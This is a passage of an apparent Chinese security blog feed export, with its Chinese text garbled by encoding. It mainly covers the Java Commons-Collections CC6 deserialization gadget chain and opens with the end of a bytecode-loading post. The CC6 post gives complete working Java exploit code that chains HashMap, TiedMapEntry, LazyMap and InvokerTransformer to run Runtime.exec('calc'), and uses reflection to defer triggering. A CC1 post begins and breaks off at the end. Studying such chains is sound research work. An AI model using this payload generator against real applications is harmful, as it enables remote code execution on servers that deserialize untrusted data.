class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="">javaå®‰å…¨æ¼«è°ˆ-Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•</a></p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d195054a6a081ba07486dcc86c6ba707">ç±»çš„åŠ¨æ€åŠ è½½</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC6(æœ€å¥½ç”¨çš„CCé“¾)</title>
    <link href="/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/"/>
    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>JAVAç‰ˆæœ¬JAVA 21</p></li><li><p>commons-collections 3.2.1</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC1ç°åœ¨æ¥è¯´çš„è¯æ¯”è¾ƒé¸¡è‚‹ã€‚å› ä¸ºåœ¨8u71ä»¥å<code>AnnotationInvocationHandler.readObject()</code>æ”¹å˜äº†ã€‚</p><p>ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬çš„åˆ©ç”¨é—®é¢˜ysoserialç»™å‡ºäº†è§£å†³æ–¹æ¡ˆCommonsCollections6ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³å¸¸ç§°çš„CC6ã€‚</p><p>å…¶å®åé¢åˆ©ç”¨é“¾å’ŒCC1æ˜¯ä¸€æ ·çš„,<code>LazyMap.get()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä»ysoserialå¯ä»¥çœ‹å‡ºé“¾é¦–æ˜¯HashMapï¼Œå…¶å®HashMapæˆ‘ä»¬æŒºç†Ÿæ‚‰ã€‚<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p><p>æ‰€ä»¥ç°åœ¨åªéœ€è¦æœ‰ä¸€ä¸ªç±»çš„<code>HashCode()</code>è°ƒç”¨äº†<code>get()</code>å°±å¯ä»¥å°†è¿™æ•´æ®µé“¾é“¾æ¥èµ·æ¥ã€‚</p><h3 id="æ”»å‡»é“¾åˆ†æ"><a href="#æ”»å‡»é“¾åˆ†æ" class="headerlink" title="æ”»å‡»é“¾åˆ†æ"></a>æ”»å‡»é“¾åˆ†æ</h3><p>ä½œè€…æ˜¯å‘ç°äº†<code>TiedMapEntry.HashCode().getValue()</code>ä¸­è°ƒç”¨äº†<code>get()</code>,é‚£è¿™å°±å¯ä»¥æŠŠå‰åä¸¤æ®µé“¾é“¾æ¥èµ·æ¥ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p><p>å®Œæ•´åˆ©ç”¨é“¾</p><p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p><h3 id="å®ç°æ”»å‡»é“¾"><a href="#å®ç°æ”»å‡»é“¾" class="headerlink" title="å®ç°æ”»å‡»é“¾"></a>å®ç°æ”»å‡»é“¾</h3><p>åé¢ä»£ç æ‰§è¡Œçš„éƒ¨åˆ†å’ŒCC1æ˜¯ä¸€æ ·çš„ï¼Œå¤åˆ¶å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç›´æ¥<code>new TiedMapEntry</code>ï¼Œçœ‹<code>TiedMapEntry</code>çš„æ„é€ å™¨ï¼Œæ‰€ä»¥mapå¯ä»¥ç›´æ¥ä¼ å…¥ä¹‹å‰çš„chainedTransformerï¼Œkeyéšä¾¿ä¼ ã€‚</p><p>ç„¶å<code>new HashMap</code>ä½œä¸ºå…¥å£ï¼Œæ”¾å…¥æŠŠtiedMapEntryæ”¾è¿›keyã€‚ä¸ºä»€ä¹ˆæŠŠtiedMapEntryæ”¾è¿›keyè€Œä¸æ˜¯æ”¾è¿›valueä¸­ï¼Ÿå› ä¸º<code>HashMap.readObject</code>æ˜¯å¯¹keyè¿›è¡Œ<code>hash()</code>ã€‚åŒæ ·çš„valueéšä¾¿ä¼ ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p><p>ä½†æ˜¯æˆ‘ä»¬åœ¨URLDNSé‚£æ¡é“¾é‡Œé¢å°±æœ‰ç»éªŒäº†ï¼Œ<code>HashMap.put</code>å°±ä¼šå¯¹keyè¿›è¡Œ<code>hash()</code>ï¼Œä¹Ÿå°±æ˜¯å¯¹keyè°ƒç”¨<code>hashCode()</code>ï¼Œä¼šç›´æ¥å¯¼è‡´åœ¨åºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥èµ°å®Œè¿™æ¡é“¾ã€‚</p><p>æ‰€ä»¥å¾—æ›´æ”¹ä¸€ä¸‹ï¼Œæ”¹æ³•å¾ˆå¤šï¼Œæ€è·¯å…¶å®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œputæ—¶æ”¾è¿›ä¸€ä¸ªä¸èƒ½è®©é“¾è¿æ¥èµ·æ¥çš„å¯¹è±¡æˆ–è€…æ–¹æ³•ï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ”¹å›è®¾æƒ³çš„è°ƒç”¨é“¾ï¼Œè®©é“¾èƒ½è¿æ¥èµ·æ¥ã€‚</p><p>è¿™é‡Œä¸»è¦å†™äº†ä¸¤ç§æ–¹å¼:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€:å…ˆæŠŠä¸æŠŠtransformersæ”¾è¿›chainedTransformerä¸­ï¼Œè¿™é‡Œnewäº†ä¸ªConstantTransformer[]&#123;&#125;ï¼ŒChainedTransformerå°±è°ƒç”¨ä¸äº†transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒ:å…ˆä¸æŠŠchainedTransformeræ”¾è¿›LazyMap.decorate()ï¼Œè¿™æ ·lazyMapä¹Ÿæ‰¾ä¸åˆ°ååŠæ¡é“¾</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€ï¼šé€šè¿‡åå°„å°†transformersæ”¾è¿›chainedTransformerä¸­</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒï¼šé€šè¿‡åå°„å°†chainedTransformeræ”¾è¿›lazyMapä¸­</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//æœ¬åœ°æµ‹è¯•è§¦å‘</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é‡åˆ°ä¸€ä¸ªå°é—®é¢˜"><a href="#é‡åˆ°ä¸€ä¸ªå°é—®é¢˜" class="headerlink" title="é‡åˆ°ä¸€ä¸ªå°é—®é¢˜"></a>é‡åˆ°ä¸€ä¸ªå°é—®é¢˜</h3><p>å‘ç°è¿™æ—¶å€™ååºåˆ—åŒ–ä¸èƒ½æˆåŠŸæ‰§è¡Œ</p><p>æˆ‘ä»¬å¯ä»¥å°è¯•è°ƒè¯•ä¸€ä¸‹ï¼Œæ·»åŠ ä¸€ä¸ªlnline Watchesï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„æ—¶å€™<code>map.put(keyï¼Œvalue)</code>æŠŠ<code>key:&quot;aaa&quot;</code>putè¿›å»äº†ï¼Œå¯¼è‡´æˆ‘ä»¬ååºåˆ—åŒ–å¾—æ—¶å€™<code>if(map.containsKey(key) == false)</code>åˆ¤å®šå¤±è´¥ï¼Œå› ä¸ºè¿™æ—¶å€™<code>if(map.containsKey(key)==true)</code>ï¼Œç„¶åå°±èµ°ä¸è¿›è¿™ä¸ªifï¼Œå¯¼è‡´è°ƒç”¨<code>transform()</code>æ–¹æ³•å¤±è´¥ï¼Œæœ€ç»ˆå¯¼è‡´é“¾ä¸èƒ½æˆåŠŸæ‰§è¡Œã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p><p>è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œç­‰putå®Œåï¼Œ<code>remove()</code>æ‰å°±è¡Œï¼Œéšåå°±å¯ä»¥æ­£å¸¸æ‰§è¡Œååºåˆ—åŒ–</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p><h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€:å…ˆæŠŠä¸æŠŠtransformersæ”¾è¿›chainedTransformerä¸­ï¼Œè¿™é‡Œnewäº†ä¸ªConstantTransformer[]&#123;&#125;ï¼ŒChainedTransformerå°±è°ƒç”¨ä¸äº†transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒ:å…ˆä¸æŠŠchainedTransformeræ”¾è¿›LazyMap.decorate()ï¼Œè¿™æ ·lazyMapä¹Ÿæ‰¾ä¸åˆ°ååŠæ¡é“¾</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€ï¼šé€šè¿‡åå°„å°†transformersæ”¾è¿›chainedTransformerä¸­</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒï¼šé€šè¿‡åå°„å°†chainedTransformeræ”¾è¿›lazyMapä¸­</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//æœ¬åœ°æµ‹è¯•è§¦å‘</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(äºŒ)-æœ€å¥½ç”¨çš„CCé“¾</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC1</title>
    <link href="/2024/05/23/JAVA%E5%AE%89%E5%85%A8/CC1/"/>
    <url>/2024/05/23/JAVA%E5%AE%89%E5%85%A8/CC1/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>JAVAç‰ˆæœ¬8u65</p></li><li><p>commons-collections 3.2.1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Common-Collections-ä»‹ç»"><a href="#Common-Collections-ä»‹ç»" class="headerlink" title="Common-Collections ä»‹ç»"></a>Common-Collections ä»‹ç»</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons CollectionsåŒ…å’Œç®€ä»‹</a></p><ul><li><p><code>org.apache.commons.collections</code> â€“ 